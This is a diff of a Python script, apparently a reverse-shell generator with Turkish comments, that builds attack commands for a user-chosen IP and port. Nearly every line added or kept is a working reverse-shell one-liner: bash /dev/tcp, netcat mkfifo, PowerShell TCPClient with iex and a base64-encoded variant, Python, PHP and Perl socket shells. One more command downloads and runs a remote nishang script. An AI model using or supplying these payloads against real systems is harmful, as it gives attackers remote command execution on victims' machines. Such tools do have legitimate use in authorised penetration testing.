@@ -75,52 +75,83 @@ def get_input():
 
     return choice, ip, port, payload_options
 
-def generate_shell(choice, ip, port, options):
-    rand_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
+def encode_powershell(cmd):
+    return base64.b64encode(cmd.encode("utf-16le")).decode()
 
-    # PowerShell base64 encode düzeltmesi
-    def encode_powershell(cmd):
-        return base64.b64encode(cmd.encode("utf-16le")).decode()
+def generate_shell(choice, ip, port, options):
+    ps_payload = (
+        f"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
+        f"$stream = $client.GetStream();"
+        f"[byte[]]$bytes = 0..65535|%{{0}};"
+        f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;"
+        f"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
+        f"$sendback = (iex $data 2>&1 | Out-String );"
+        f"$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
+        f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
+        f"$stream.Write($sendbyte,0,$sendbyte.Length);"
+        f"$stream.Flush()}};$client.Close()"
+    )
 
     shells = {
-        1: [
-            f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
-            f"0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196",
-            f"sh -i >& /dev/udp/{ip}/{port} 0>&1",
-            f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"
-        ],
-        2: [
-            f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream(); ... $client.Close()\"",
-            f"powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream(); ... $c.Close()\"",
-            f"powershell -e {encode_powershell(f'$client = New-Object System.Net.Sockets.TCPClient(\\'{ip}\\',{port});$stream = $client.GetStream(); ... $client.Close()')}",
-            f"powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}"
-        ],
-        3: [
-            f"nc -e /bin/sh {ip} {port}",
-            f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
-            f"nc {ip} {port} | /bin/sh | nc {ip} {port}",
-            f"busybox nc {ip} {port} -e /bin/sh"
-        ],
-        4: [
-            f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'",
-            f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'",
-            f"python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"{ip}\",{port}));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'",
-            f"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call([\"cmd.exe\",\"/k\"])'"
-        ],
-        5: [
-            f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
-        ],
-        8: [
-            f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
-        ]
+        1: {
+            'bash': [
+                f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
+                f"0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196",
+                f"sh -i >& /dev/udp/{ip}/{port} 0>&1",
+                f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"
+            ]
+        },
+        2: {
+            'ps': [
+                f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream(); ... $client.Close()\"",
+                f"powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream(); ... $c.Close()\"",
+                f"powershell -e {encode_powershell(ps_payload)}",
+                f"powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}"
+            ]
+        },
+        3: {
+            'nc': [
+                f"nc -e /bin/sh {ip} {port}",
+                f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
+                f"nc {ip} {port} | /bin/sh | nc {ip} {port}",
+                f"busybox nc {ip} {port} -e /bin/sh"
+            ]
+        },
+        4: {
+            'python': [
+                f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'",
+                f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'",
+                f"python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"{ip}\",{port}));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'",
+                f"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call([\"cmd.exe\",\"/k\"])'"
+            ]
+        },
+        5: {
+            'php': [
+                f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+                f"php -r '$sock=fsockopen(\"{ip}\",{port});shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+                f"php -r '$sock=fsockopen(\"{ip}\",{port});system(\"/bin/sh -i <&3 >&3 2>&3\");'",
+                f"php -r '$sock=fsockopen(\"{ip}\",{port});passthru(\"/bin/sh -i <&3 >&3 2>&3\");'"
+            ]
+        },
+        8: {
+            'perl': [
+                f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
+                f"perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"{ip}:{port}\");STDIN->fdopen($c,r);STDOUT->fdopen($c,w);STDERR->fdopen($c,w);system(\"/bin/sh -i\");'",
+                f"perl -MIO::Socket -e '$c=IO::Socket::INET->new(PeerAddr=>\"{ip}\",PeerPort=>{port},Proto=>\"tcp\");while(<$c>){{system $_}}'"
+            ]
+        }
     }
 
-    if choice in options:
-        option_key = list(options.keys())[0]
-        option_index = int(options[option_key]) - 1
-        return shells[choice][option_index]
+    if choice in shells and list(options.keys()):
+        opt_key = list(options.keys())[0]
+        opt_index = int(options[opt_key]) - 1
+        return shells[choice][opt_key][opt_index]
     else:
-        return shells[choice][0]
+        if choice in shells:
+            first_key = list(shells[choice].keys())[0]
+            return shells[choice][first_key][0]
+        else:
+            return "Seçilen shell için payload tanımlı değil."
 
 def print_listener_command(port, ip, shell_type):
     print(f"\nDinleyici komutu (kendi makinende çalıştır):")
